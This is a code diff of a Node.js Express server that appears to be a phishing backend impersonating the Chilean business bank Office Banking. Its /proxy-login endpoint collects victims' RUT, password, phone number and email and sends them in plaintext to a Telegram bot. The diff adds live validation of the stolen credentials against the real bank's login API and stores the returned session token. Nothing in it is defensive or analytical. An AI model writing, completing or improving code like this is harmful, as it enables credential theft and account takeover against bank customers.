@@ -79,30 +79,52 @@ app.post("/autorizar", async (req, res) => {
   }
 });
 
-// Endpoint para login → enviar credenciales o correo a Telegram
+// ✅ Endpoint para login → validar contra empresas.officebanking.cl y enviar a Telegram
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, telefono, mail } = req.body;
   let mensaje;
 
-  if (mail) {
-    mensaje = `Correo actualizado:\n${mail || "(sin correo)"}`;
-  } else {
-    mensaje = `Login recibido AutOB:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nTeléfono: ${telefono || "(sin teléfono)"}`;
-  }
-
   try {
+    // Si vienen credenciales, validar contra la web externa
+    if (rut && passwd) {
+      const response = await fetch("https://empresas.officebanking.cl/api/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ rut, passwd })
+      });
+
+      if (!response.ok) {
+        return res.status(401).json({ status: "error", mensaje: "Credenciales inválidas" });
+      }
+
+      const data = await response.json();
+      const token = data.token;
+
+      if (!token) {
+        return res.status(401).json({ status: "error", mensaje: "No se ha podido validar correctamente" });
+      }
+
+      // Guardar token en la sesión
+      req.session.autenticado = true;
+      req.session.token = token;
+    }
+
+    // Mensaje diferenciado para Telegram
+    if (mail) {
+      mensaje = `Correo actualizado:\n${mail || "(sin correo)"}`;
+    } else {
+      mensaje = `Login recibido AutOB:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nTeléfono: ${telefono || "(sin teléfono)"}`;
+    }
+
     await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    // ✅ Aquí marcamos la sesión como autenticada
-    req.session.autenticado = true;
-
     res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
   } catch (err) {
-    res.status(500).json({ status: "error", error: err.message });
+    res.status(500).json({ status: "error", mensaje: "Error al validar credenciales" });
   }
 });
 
